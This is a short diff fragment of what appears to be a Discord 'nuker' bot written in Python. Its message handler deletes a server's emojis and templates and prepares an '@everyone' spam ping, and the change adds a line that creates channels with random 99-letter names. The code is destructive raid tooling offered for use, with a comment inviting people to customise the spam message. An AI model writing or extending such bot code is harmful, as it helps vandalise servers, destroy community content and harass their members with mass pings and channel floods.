@@ -52,6 +52,7 @@ async def on_message(message):
             await Emoji.delete()
         for template in await message.guild.templates():
            await template.delete()
+        await message.guild.create_text_channel(randomletters(99))
     
     response = '@everyone' #You can add some messages via editing this string
     
